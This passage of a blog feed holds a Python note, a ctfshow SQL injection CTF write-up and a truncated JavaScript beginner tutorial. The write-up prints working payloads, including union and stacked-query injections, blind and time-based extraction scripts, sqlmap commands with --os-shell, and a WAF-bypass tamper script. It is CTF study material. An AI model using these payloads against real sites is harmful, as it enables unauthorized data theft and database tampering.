函数基础</h3><p>使用def来定义函数，加：而不是花括号，return返回值，也可以返回一个元组，如果没想好函数怎么写，可以使用pass来占位。</p><p>python里没有传值和传值的说法，只有传的是可变对象和不可变对象的说法，如果往函数中传入的是可变对象，那么函数就可以使得该对象发生改变，如果传入的是不可变的对象，则函数中改变时只是新建了一个副本进行改变，原来的值没有变化。</p><p>可以使用lambda函数来创建一个匿名函数</p><h3 id="2-函数参数"><a href="#2-函数参数" class="headerlink" title="2. 函数参数"></a>2. 函数参数</h3><ol><li>参数的数量一定要一一对应，否则会报错</li><li>函数参数的四种类型：<ul><li>必备参数：必须要传入，没有默认值</li><li>关键字参数：允许传入0个或任意个含参数名的参数（传键值对），这些关键字参数在函数内部自动组装成一个dict，**kw</li><li>默认参数：不传入时使用默认值</li><li>不定长参数：*arg，接收一个元组或者列表，不定长参数只能声明一个且必须在最后声明。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Knowledge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sql注入篇</title>
      <link href="/2023/06/30/ctfshow-sql%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2023/06/30/ctfshow-sql%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h4 id="select无过滤"><a href="#select无过滤" class="headerlink" title="select无过滤"></a><strong>select无过滤</strong></h4><p>web171：最常规注入</p><p>web172：加了约束，判断回显的字段是否有flag，可以用to_base64(username)绕过，也可where</p><p>web173：同上</p><h4 id="select有过滤"><a href="#select有过滤" class="headerlink" title="select有过滤"></a>select有过滤</h4><p>web174：过滤了回显中的flag和数字0-9，两种方法绕过，一个方法是写脚本盲注，要注意用burpsuite抓包发现一个可以查询是否成功的api接口，对这个接口进行盲注爆破flag，另一个方法是将所有的数字替换成其他的字符，再逆操作解码即可。第二种方法的payload：</p><p>-1’ union select ‘a’,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,”1”,”@A”),”2”,”@B”),”3”,”@C”),”4”,”@D”),”5”,”@E”),”6”,”@F”),”7”,”@G”),”8”,”@H”),”9”,”@I”),”0”,”@J”) from ctfshow_user4 where username &#x3D; ‘flag’ –+</p><p>用到了sql中的replace函数，python中也有相应的replace，逆操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag64 = &quot;ctfshow&#123;@Hb@Ff@De@Hd-cb@E@C-@D@A@Hd-@Ib@J@A-b@A@Feed@Ea@H@E@B@J&#125;&quot;</span><br><span class="line"></span><br><span class="line">flag = flag64.replace(&quot;@A&quot;, &quot;1&quot;).replace(&quot;@B&quot;, &quot;2&quot;).replace(&quot;@C&quot;, &quot;3&quot;).replace(&quot;@D&quot;, &quot;4&quot;).replace(&quot;@E&quot;, &quot;5&quot;).replace(</span><br><span class="line">   &quot;@F&quot;, &quot;6&quot;).replace(&quot;@G&quot;, &quot;7&quot;).replace(&quot;@H&quot;, &quot;8&quot;).replace(&quot;@I&quot;, &quot;9&quot;).replace(&quot;@J&quot;, &quot;0&quot;)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>web175：用正则表达式过滤掉了所有字符，只能使用盲注</p><p>由于查看api接口发现不管输入什么都是返回错误，只能使用时间盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://3f1538ed-4694-4f48-8879-3f4eff06167d.challenge.ctf.show/api/v5.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">   i = i+1</span><br><span class="line">   left = 32</span><br><span class="line">   right = 127</span><br><span class="line">   while left &lt; right:</span><br><span class="line">      mid = (left+right) // 2</span><br><span class="line">      payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&quot;</span><br><span class="line">      try:</span><br><span class="line">         res = requests.get(url = url+payload,timeout=0.6)</span><br><span class="line">         right = mid</span><br><span class="line">      except Exception as e:</span><br><span class="line">         left = mid+1</span><br><span class="line">   if left != 32:</span><br><span class="line">      flag+=chr(left)</span><br><span class="line">      print(flag)</span><br><span class="line">   else:</span><br><span class="line">      break</span><br></pre></td></tr></table></figure><p>一个标准的时间盲注模板，不需要引入系统时间，直接在timeout内看是否能登上网页，使用二分查找法来加速，不同的题只需要改payload和url即可</p><p>web176：<strong>过滤了union，select</strong>等，使用大小写混搭绕过</p><p>web177：176基础上<strong>过滤了空格</strong>，空格被过滤可以用，&#x2F;**&#x2F;，%09，%0a，%0b，%0c，%0d还有括号绕过，注意不能用%20，因为空格也会被解析成%20，其实根本没有绕过。</p><p>web178：177基础上过滤了&#x2F;**&#x2F;，依然可以用剩下的各种符号绕过</p><h4 id="根据查询语句绕过"><a href="#根据查询语句绕过" class="headerlink" title="根据查询语句绕过"></a>根据查询语句绕过</h4><p>web181：<strong>运算符优先级绕过</strong> payload：-1’||username&#x3D;’flag ，利用原查询中的and比后面我们自己加进来的or优先级高来绕过，前面的先进行判断，结果为错，因为没有id&#x3D;-1的列，执行后面的username&#x3D;’flag查询，得到flag</p><p>web187: <strong>md5(string,true)绕过</strong></p><p>$password &#x3D; md5($_POST[‘password’],true);</p><p>password&#x3D;ffifdyop或者是129581926211651571912466741651878684928可以登录成功</p><p>web188：<strong>mysql弱类型比较绕过</strong></p><p>在mysql中字符串与数字比较时，以字母为开头的字符串都会转化成0</p><p>因此where username&#x3D;0这个查询语句可以把所有username以字母开头的数据查出来</p><p>if($row[‘pass’]&#x3D;&#x3D;intval($password)){这个pass也是以字母开头的，传入0可绕过。</p><p><strong>注意</strong>：如果有不是以字母开头的数据就会匹配不成功，这是可以用username&#x3D;1||1来匹配，由于或的特性，这样一定会匹配成功。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>web189：<strong>load_file+盲注</strong></p><p>题目提示flag在&#x2F;api&#x2F;index.php中，尝试用select读取发现select被屏蔽，只能使用盲注，根据上一题，尝试输入账号密码为0，提示密码错误，而把账号改成1提示查询失败，利用这个&#x2F;api&#x2F;index.php不同的返回值来做盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;0&#125;&#x27;),1,0)&quot;</span></span><br><span class="line">dic = &#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(flag + j),</span><br><span class="line"><span class="comment"># 1返回\u67e5\u8be2\u5931\u8d25</span></span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意load_file读取一定要完整的路径，regexp用于正则匹配flag，在ctfshow{后面依次尝试添加不同的字母，若返回查询失败说明if语句返回了1，将该字母加入到flag中</p><p>web190：经典无过滤布尔盲注，见bool脚本，使用二分法加速</p><p>web191：过滤了ascii，使用ord函数替代，功能和ascii完全一致</p><p>web192：过滤了ord，将payload改一下，改成（注意{}加单引号表示字符）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;&#x27;or (substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1))&gt;&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br></pre></td></tr></table></figure><p>将mid转化成char再进行比较，由于sql比较时会先将字符转化为大写再比较，故输出的都是大写，也可以使用枚举，不使用二分法。</p><p>web193：过滤了substr，可以使用left，right，mid等替换</p><p>同时也可以使用之前189提到的正则表达式的方式来匹配flag，就不需要对flag进行截断操作，不过这样就无法使用二分来加速且需要提前知道flag的前缀。</p><p>web194：同上</p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>web195：从本题开始<strong>堆叠注入</strong>的学习<strong>（多条组合查询，或者使用如handler等多条语句的命令，或者通过增删改查直接操作数据库来绕过验证）</strong></p><p>只要权限够，就可以进行<strong>增删改查</strong>，堆叠注入不是很常用，因为很容易被限制，但姿势很多，要注意积累。</p><p>本题采用了改的方法，将表中的pass即密码字段全部改为1，再使用0这个万能用户名可以登录获得flag。也可以使用十六进制的admin登录，为什么一定要使用十六进制呢，因为这个sql查询语句没有用引号把传入字符串包起来。</p><p>payload：0;update`ctf_user`set`pass&#96;&#x3D;1过滤了空格可以用反引号包住列名和表名，在handler里也有所提及。<strong>update + set</strong></p><p>web196：用户名不能太长，本题过滤的是se1ect并没有过滤select，使用0;select(1);前面的查询返回空，而1填入了<strong>row[0]<strong>中（row代表的是sql查询语句返回的数据，正因如此，返回逻辑中才需要用row[0]和密码比较），密码也填1即可登录。</strong>注意密码的比较逻辑</strong></p><p>web197：过滤了select，但没有过滤show，可以使用0;show tables，则tables返回的结果ctfshow_user填入到了**row[0]**中，密码填ctfshow_user就可登录。</p><p>web198：和上一题同理，同时也可以使用另一种方法，将id和pass的列名互换，然后爆破admin的id，id匹配上了就能成功登录。<strong>alter + change</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;0x61646d696e;alter table ctfshow_user change column `pass` `gylq` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `gylq` `id` varchar(255);&#x27;</span></span><br></pre></td></tr></table></figure><p>web199-200：同理</p><h4 id="sqlmap练习"><a href="#sqlmap练习" class="headerlink" title="sqlmap练习"></a>sqlmap练习</h4><p><a href="https://blog.csdn.net/songbai220/article/details/109303110?ops_request_misc=%7B%22request_id%22:%22168299301716782425133319%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168299301716782425133319&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-109303110-null-null.142%5Ev86%5Einsert_down1,239%5Ev2%5Einsert_chatgpt&utm_term=sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B&spm=1018.2226.3001.4187">(12条消息) sqlmap使用教程(超详细)_Redmaple925的博客-CSDN博客</a></p><p>web201：这一题提示需要使用–refer&#x3D;“ctf.show”绕过，同时使用–user-agent指定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1：sqlmap -u [``&quot;URL&quot;``] ``//测试是否存在注入</span><br><span class="line">step2：sqlmap -u [``&quot;URL&quot;``] -current-db ``//查询当前数据库</span><br><span class="line">step3：sqlmap -u [``&quot;URL&quot;``] -D [``&quot;数据库名&quot;``] --tables ``//查询当前数据库中的所有表</span><br><span class="line">step4：sqlmap -u [``&quot;URL&quot;``] -D [``&quot;数据库名&quot;``] -T [``&quot;表名&quot;``] --columns ``//查询指定库中指定表的所有列(字段)</span><br><span class="line">step5：sqlmap -u [``&quot;URL&quot;``] -D [``&quot;数据库名&quot;``] -T [``&quot;表名&quot;``] -C [``&quot;列名&quot;``] --dump ``//打印出指定库中指定表指定列中的字段内容</span><br></pre></td></tr></table></figure><p>注意如果是get请求，要在url后面加上?id&#x3D;，表示id是get接收的参数</p><p>web202：使用–data&#x3D;“id&#x3D;1”来指定post请求，其他一样。</p><p>web203：使用–method&#x3D; 来指定其他请求，如本题中需要指定put请求，另外需要注意更改content-type为text&#x2F;plain,–method&#x3D;”PUT” –data&#x3D;”id&#x3D;1” –headers&#x3D;”Content-Type: text&#x2F;plain”</p><p>web204：在上一题的基础上加上了–cookie，使用bp抓包，把抓到的cookie填进去</p><p>sqlmap -u “<a href="http://1f958108-6cb3-4246-a57e-cc16dcd0bd2a.challenge.ctf.show/api/index.php&quot;">http://1f958108-6cb3-4246-a57e-cc16dcd0bd2a.challenge.ctf.show/api/index.php&quot;</a> –data “id&#x3D;1” –method&#x3D;PUT –header&#x3D;”Content-Type:text&#x2F;plain” –cookie&#x3D;”PHPSESSID&#x3D;jg00d7vu29fi84ohkp3ksi74t8; ctfshow&#x3D;3f55bb1bfd3e87d8ffcea6d6d55ea6a0” –referer&#x3D;”ctf.show” -D ctfshow_web -T ctfshow_user</p><p>web205：通过bp抓包可以发现，在请求api之前，网页先请求了getToken鉴权页面，使用sqlmap的–safe-url来先访问这个安全页面，再访问进行sql测试的api页面，同时要注意–safe-freq设置成1，每次都要先访问鉴权页面</p><p>sqlmap -u “<a href="http://02d91115-3218-4721-8016-a0bed82b37e3.challenge.ctf.show/api/index.php&quot;">http://02d91115-3218-4721-8016-a0bed82b37e3.challenge.ctf.show/api/index.php&quot;</a> –data “id&#x3D;1” –method&#x3D;PUT –safe-url&#x3D;”<a href="http://02d91115-3218-4721-8016-a0bed82b37e3.challenge.ctf.show/api/getToken.php&quot;">http://02d91115-3218-4721-8016-a0bed82b37e3.challenge.ctf.show/api/getToken.php&quot;</a> –safe-freq&#x3D;1 –header&#x3D;”Content-Type:text&#x2F;plain” –cookie&#x3D;”PHPSESSID&#x3D;di7ffs2tm2hhprosgds13ga9pj” –referer&#x3D;”ctf.show” -D ctfshow_web -T ctfshow_flax –dump</p><p>web206：同上</p><p>web207：tamper初体验，–tamper&#x3D;脚本名，来调用脚本，当调用多个脚本时，脚本之间用逗号隔开，调用的脚本放在sqlmap文件夹下的tamper文件夹中。可以自己写也可以用别人写好的。</p><p>本题过滤了空格，直接使用别人写好的模块space2comment绕过即可成功注入。</p><p>web208：同上</p><p>web209：本题过滤了等号和空格和*号，需要绕过对等号和空格的过滤，而现成的脚本中没有这样的功能，需要我们自行写tamper，然后放进sqlmap的tamper文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">   <span class="keyword">return</span> payload.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot; like &quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br></pre></td></tr></table></figure><p>tamper分三部分，优先级，适用情况，主要函数（接受的参数为payload和**kwargs。返回值为替换后的payload，要替换的就是payload，来完成想要的绕过。kwargs是修改http头里的内容函数）</p><p>web210：同上，自写tamper对waf的操作进行反操作或者绕过。</p><p>web211：同上，绕过加反操作，自写的脚本详见myTamper</p><p>web212：同上</p><p>web213：使用sqlmap的–os-shell来获取网站的shell</p><p>getshell条件：</p><p>1.网站必须是root权限<br>2.知道网站的绝对路径<br>3.PHP关闭魔术引号，php主动转义功能关闭<br>4.secure_file_priv&#x3D;值为空</p><p>getshell成功上传文件之后可以使用菜刀连接或者直接在终端输命令即可 ls &#x2F;</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>web214：啥提示都没有，返回index.php页面，web题遇到啥都没有的情况可以通过bp抓一下包看看有没有什么突破口。</p><p>抓包发现网页通过post方法提交了一个ip和一个debug，debug设置为0，修改debug为1出现了查询语句，由于正误无任何回显，故采用基于时间的盲注，本题为标准时间盲注模板。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://52996c56-6c23-4abb-8c0b-545755d9cb91.challenge.ctf.show/api/&quot;</span></span><br><span class="line">chars = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-=&#123;&#125;_,&#x27;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">left = <span class="number">32</span></span><br><span class="line">right = <span class="number">127</span></span><br><span class="line"><span class="keyword">while</span> left &lt; right:</span><br><span class="line">mid = (left+right)//<span class="number">2</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),1)&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),0)&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagx&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),0)&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(i, mid),</span><br><span class="line"><span class="string">&quot;debug&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">right = mid</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line">result += <span class="built_in">chr</span>(left)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>web215：加了单引号，修改脚本的payload至闭合查询语句即可。</p><p>web216：注意闭合查询语句，且前面的base64已经被闭合了，故不需要对我们的if语句进行处理，直接用上一题脚本微改即可。</p><p>web217：过滤了sleep函数，使用benchmark(5000000,sha(1))来代替sleep(3)，benchmark第一个参数表示计算重复的次数，第二个参数表示计算的式子，同样能起到延时的作用。</p><p>web218：过滤了sleep和benchmark，可以使用heavy query方法，heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript快速入门</title>
      <link href="/2023/06/30/JavaScript/"/>
      <url>/2023/06/30/JavaScript/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="1-快速入门"><a href="#1-快速入门" class="headerlink" title="1.快速入门"></a>1.快速入门</h2><h3 id="1-1-引入"><a href="#1-1-引入" class="headerlink" title="1.1 引入"></a>1.1 引入</h3><ol><li>内部标签 &lt; script &gt;&lt; &#x2F;script &gt;</li><li>外部引入 &lt; script src&#x3D;”study.js” &gt;&lt; &#x2F;script &gt;</li></ol><h3 id="1-2-基本语法"><a href="#1-2-基本语法" class="headerlink" title="1.2 基本语法"></a>1.2 基本语法</h3><p>和其他高级语言基本一样，var定义变量，console.log(变量名)输出到控制台。</p><p>F12控制台常用</p><p>elements爬网站 </p><p>console 调试js代码  </p><p>source 打断点 </p><p>network 抓包 </p><p>application 获取cookie</p><h3 id="1-3-数据类型"><a href="#1-3-数据类型" class="headerlink" title="1.3 数据类型"></a>1.3 数据类型</h3><ol><li><p>变量 var，所有变量都用var</p></li><li><p>数字 number NaN not a number Infinity无限大</p></li><li><p>字符串</p></li><li><p>布尔值</p></li><li><p>逻辑运算</p></li><li><p>比较运算符，两个等号表示只需值一样，三个等号表示值和类型必须一样。</p></li><li><p>null 空，undef未定义</p></li><li><p>数组：js的数组不一定是相同类型的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="literal">null</span>,<span class="literal">true</span>];</span><br><span class="line"><span class="comment">//第二种定义方法</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="string">&#x27;hello&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>对象：对象是大括号，数组是中括号 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>:<span class="number">3</span>,</span><br><span class="line"><span class="attr">tags</span>:[<span class="string">&#x27;js&#x27;</span>,<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;...&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取对象值 person.name  - &gt; “Tom”.</p></li></ol><h2 id="2-数据类型详解"><a href="#2-数据类型详解" class="headerlink" title="2.数据类型详解"></a>2.数据类型详解</h2><h3 id="2-1-字符串"><a href="#2-1-字符串" class="headerlink" title="2.1 字符串"></a>2.1 字符串</h3><ol><li>单引号或双引号包裹</li><li>转义字符 \</li><li>多行字符串编写，使用 &#96;&#96; 包裹</li><li>模板字符串</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;Tom&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> msg = <span class="string">`你好，<span class="subst">$&#123;name&#125;</span>`</span></span><br></pre></td></tr></table></figure><ol start="5"><li>字符串长度 str.length</li><li>字符串是常量，不可变，可以通过下标访问每一个字母</li><li>大小写转换 toUpperCase()这是方法不是属性</li><li>定位字母，indexOf()</li><li>substring(start,end)</li></ol><h3 id="2-2-数组"><a href="#2-2-数组" class="headerlink" title="2.2 数组"></a>2.2 数组</h3><ol><li>长度和length和indexOf和string一样</li><li>slice()切出数组的一部分</li><li>push()，pop()尾插和尾删，尾删弹出了元素</li><li>unshift压入头，shift头弹出一个元素</li><li>sort(),reverse()排序，翻转，concat拼接数组，返回一个新的，其实并没有改变原数组。 </li><li>join 打印拼接字符，使用特定的字符串连接</li></ol><h3 id="2-3-对象"><a href="#2-3-对象" class="headerlink" title="2.3 对象"></a>2.3 对象</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 对象名 = &#123;</span><br><span class="line">属性名：属性值，</span><br><span class="line">属性名：属性值，</span><br><span class="line">属性名：属性值</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对象由若干个键值对组成，所有键都是字符串，值是任意对象</p><p>使用不存在的对象不会报错，会返回undefined</p><p>delete删除对象属性</p><p>直接给新属性添加值实现动态添加</p><p>判断属性是否在这个对象中  xxx in 对象名</p><p>判断属性是否是对象自身拥有的  hasOwnProperty()</p><h3 id="2-4-流程控制"><a href="#2-4-流程控制" class="headerlink" title="2.4 流程控制"></a>2.4 流程控制</h3><p>while if等和其他高级语言一样。</p><p>forEach循环   .forEach(函数)</p><p>for … in …循环</p><h3 id="2-5-Map和Set"><a href="#2-5-Map和Set" class="headerlink" title="2.5 Map和Set"></a>2.5 Map和Set</h3><p>ES6的新特性，和c++的map和set类似，起到去重的效果</p><p>Map  get获得值，set新增或修改(键，值)</p><p>Set  add加，delete删，has（）看有没有</p><p>只能用new来创建这两个</p><h2 id="3-函数"><a href="#3-函数" class="headerlink" title="3.函数"></a>3.函数</h2><h3 id="3-1-定义函数"><a href="#3-1-定义函数" class="headerlink" title="3.1 定义函数"></a>3.1 定义函数</h3><p>function 函数名{}</p><p>arguments，所有传递进来的参数形成的一个数组。</p><p>rest获取除了已定义的参数之外的所有参数a,b,…rest必须使用…</p><h3 id="3-2-作用域"><a href="#3-2-作用域" class="headerlink" title="3.2 作用域"></a>3.2 作用域</h3><p>和c++完全一样。建议使用let去定义局部作用域的变量。</p><h2 id="4-内部对象"><a href="#4-内部对象" class="headerlink" title="4.内部对象"></a>4.内部对象</h2><h3 id="4-1-Data"><a href="#4-1-Data" class="headerlink" title="4.1 Data"></a>4.1 Data</h3><p>用来获取时间 有getFullyear之类的方法</p><h3 id="4-2-Json"><a href="#4-2-Json" class="headerlink" title="4.2 Json"></a>4.2 Json</h3><p>json是一种轻量级的数据交换格式，json的格式，对象都用{}，数组都用[]，所有的键值对都是用key:value</p><p>json字符串和js对象的转化</p><p>使用JSON.stringify(对象)可以将对象转化为json字符串，相当于把对象进行了扁平化，使他变成了一个json字符串，不再可以展开。</p><p>使用JSON.parse(‘Json字符串’)可以把json字符串转化为js对象。</p><h2 id="5-操作BOM对象"><a href="#5-操作BOM对象" class="headerlink" title="5.操作BOM对象"></a>5.操作BOM对象</h2><ol><li><p>window 控制浏览器窗口</p></li><li><p>navigator 封装了浏览器的信息，但是可以人为改</p></li><li><p>location 查看当前页面的URL信息，location.assign可以实现网页的跳转，reload可以刷新网页</p></li><li><p>document代表了当前的页面，html dom文档树</p><p>可以具体获取文档树的节点，也可以用.cookie直接获取cookie，劫持cookie原理，获取用户的cookie并上传到自己的服务器。</p></li><li><p>history代表浏览器的历史记录 history.back(),.forward()可以控制网页的前进和后退。</p></li></ol><h2 id="6-操作DOM对象"><a href="#6-操作DOM对象" class="headerlink" title="6.操作DOM对象"></a>6.操作DOM对象</h2><p>浏览器网页就是一个DOM树形结构</p><ul><li>更新：更新dom节点</li><li>遍历：得到dom节点</li><li>删除：删除一个dom节点</li><li>添加：添加一个新节点</li></ul><p>要操作一个dom节点，就必须先获得这个dom节点</p><ul><li>增加节点：创建一个新的<code>&lt;p&gt;</code>元素，并将其添加到<code>&lt;div id=&quot;container&quot;&gt;</code>中。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个新的&lt;p&gt;元素</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="comment">// 设置元素的文本内容</span></span><br><span class="line">p.<span class="property">innerHTML</span> = <span class="string">&quot;这是一个新的段落&quot;</span>;</span><br><span class="line"><span class="comment">// 获取&lt;div id=&quot;container&quot;&gt;元素</span></span><br><span class="line"><span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line"><span class="comment">// 将&lt;p&gt;元素添加到&lt;div&gt;元素中</span></span><br><span class="line">container.<span class="title function_">appendChild</span>(p);</span><br></pre></td></tr></table></figure><ul><li>删除节点：删除<code>&lt;div id=&quot;container&quot;&gt;</code>中的第一个子节点。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取&lt;div 